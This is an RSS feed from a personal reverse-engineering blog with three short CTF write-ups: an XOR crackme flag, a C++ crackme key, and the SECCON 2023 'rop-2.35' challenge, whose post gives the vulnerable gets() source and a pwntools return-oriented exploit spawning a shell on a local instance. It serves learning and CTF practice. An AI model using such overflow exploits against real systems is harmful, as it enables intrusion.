<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>easy on uint8_t* blog</title>
    <link>https://blog.i-eat-sponges.ca/tags/easy/</link>
    <description>Recent content in easy on uint8_t* blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 24 Sep 2023 18:19:45 -0400</lastBuildDate><atom:link href="https://blog.i-eat-sponges.ca/tags/easy/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Discord Cracking Challenge (easy)</title>
      <link>https://blog.i-eat-sponges.ca/cracking/discord1/</link>
      <pubDate>Sun, 24 Sep 2023 18:19:45 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/cracking/discord1/</guid>
      <description>This binary came from a discord server, I won&amp;rsquo;t mention which exactly, so this won&amp;rsquo;t be indexed.
The binary was really easy, we see a while loop and the xor key \xda\xd0\x23\x73.
I solved the challenge using binary ninja python api, took me about 10 seconds.
&amp;gt;&amp;gt;&amp;gt; output = bv.read(0x140009000, 0x20) &amp;gt;&amp;gt;&amp;gt; xor = Transform[&amp;#39;XOR&amp;#39;] &amp;gt;&amp;gt;&amp;gt; xor.decode(output, {&amp;#39;key&amp;#39; : b&amp;#39;\xda\xd0\x23\x73&amp;#39;}) b&amp;#39;FLAG{ReversE_EngineerinG_IS_FuN}&amp;#39; </description>
      <content>&lt;p&gt;This binary came from a discord server, I won&amp;rsquo;t mention which exactly, so this won&amp;rsquo;t be indexed.&lt;/p&gt;
&lt;p&gt;The binary was really easy, we see a while loop and the xor key &lt;code&gt;\xda\xd0\x23\x73&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I solved the challenge using binary ninja python api, took me about 10 seconds.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x140009000&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Transform[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XOR&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; xor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(output, {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xda\xd0\x23\x73&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FLAG&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{ReversE_EngineerinG_IS_FuN}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Hexagon</title>
      <link>https://blog.i-eat-sponges.ca/cracking/hexagon/</link>
      <pubDate>Sat, 23 Sep 2023 16:26:10 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/cracking/hexagon/</guid>
      <description>Super easy reverse-engineering challenge, very good intro to reversing C++ binaries.
You&amp;rsquo;ll learn how std::cout, std::cin works at a lower level.
For example it&amp;rsquo;s the first time i notice that std::cout and std::cin are stored in the .bss segment.
As you can see the challenge is relatively easy, we&amp;rsquo;re checking that the input is between 7 and 11 bytes. Next we&amp;rsquo;re doing the following checks.
byte 0 needs to be J (R - 0x8) byte 2 needs to be 0 byte 4 needs to be - byte 3 and 7 needs to be equal If we match all these conditions then we won the challenge, we can come up with the answer.</description>
      <content>&lt;p&gt;Super easy reverse-engineering challenge, very good intro to reversing C++ binaries.&lt;/p&gt;
&lt;p&gt;You&amp;rsquo;ll learn how &lt;code&gt;std::cout&lt;/code&gt;, &lt;code&gt;std::cin&lt;/code&gt; works at a lower level.&lt;/p&gt;
&lt;p&gt;For example it&amp;rsquo;s the first time i notice that &lt;code&gt;std::cout&lt;/code&gt; and &lt;code&gt;std::cin&lt;/code&gt; are stored in the &lt;code&gt;.bss&lt;/code&gt; segment.&lt;/p&gt;

&lt;img src=&#34;https://blog.i-eat-sponges.ca/code.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;    /&gt;


&lt;p&gt;As you can see the challenge is relatively easy, we&amp;rsquo;re checking that the input is between 7 and 11 bytes. Next we&amp;rsquo;re doing the following checks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;byte 0 needs to be J (R - 0x8)&lt;/li&gt;
&lt;li&gt;byte 2 needs to be 0&lt;/li&gt;
&lt;li&gt;byte 4 needs to be -&lt;/li&gt;
&lt;li&gt;byte 3 and 7 needs to be equal&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we match all these conditions then we won the challenge, we can come up with the answer.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;JA0A-AAA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this key, we successfully win the challenge.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>SECCON 2023 - rop-2.35</title>
      <link>https://blog.i-eat-sponges.ca/exploitation/rop_2-35/</link>
      <pubDate>Fri, 22 Sep 2023 15:18:52 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/exploitation/rop_2-35/</guid>
      <description>This challenge comes from SECCON 2023, it&amp;rsquo;s one of the easiest challenges available in the CTF.
We&amp;rsquo;re given the source code, looking at it we have a good glance at the challenge.
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void main() { char buf[0x10]; system(&amp;#34;echo Enter something:&amp;#34;); gets(buf); } We read using the vulnerable gets function into a 16 bytes buffer.
So logically, by looking at the stack, to control the return address we would need 0x10 bytes to overflow our buffer and then 0x8 bytes to overflow RBP for a total of 0x18 bytes before hitting the return address.</description>
      <content>&lt;p&gt;This challenge comes from SECCON 2023, it&amp;rsquo;s one of the easiest challenges available in the CTF.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;re given the source code, looking at it we have a good glance at the challenge.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo Enter something:&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;gets&lt;/span&gt;(buf);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We read using the vulnerable &lt;code&gt;gets&lt;/code&gt; function into a 16 bytes buffer.&lt;/p&gt;
&lt;p&gt;So logically, by looking at the stack, to control the return address we would need &lt;code&gt;0x10&lt;/code&gt; bytes to overflow our buffer and then &lt;code&gt;0x8&lt;/code&gt; bytes to overflow RBP for a total of &lt;code&gt;0x18 bytes&lt;/code&gt; before hitting the return address.&lt;/p&gt;
&lt;p&gt;Now the question is where can we return, or what do we do.&lt;/p&gt;
&lt;p&gt;Running the challenge in gdb, we can see that when main returns rdi contains a writable pointer to libc.&lt;/p&gt;
&lt;p&gt;We therefore use this pointer to a gets call (we don&amp;rsquo;t need to change rdi since it already contains the writable pointer), and we give the command we&amp;rsquo;d like to execute to this gets call.&lt;/p&gt;
&lt;p&gt;Then we can directly use a call to system, since rdi already contains the pointer.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the exploit i used to locally solved this challenge.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(exe)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p64(exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gets),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p64(exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(p1))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin0sh&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here&amp;rsquo;s the exploit i ran on the remote challenge.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(exe)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p64(exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gets),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p64(exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(p1))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin0sh&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;if there&amp;rsquo;s one lesson to retain from this challenge, it&amp;rsquo;s to always check out the state of the registers when crashing a program !!!&lt;/p&gt;
&lt;p&gt;We were also being given a decent docker setup to run the challenge on, this is another thing i retained from this challenge.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
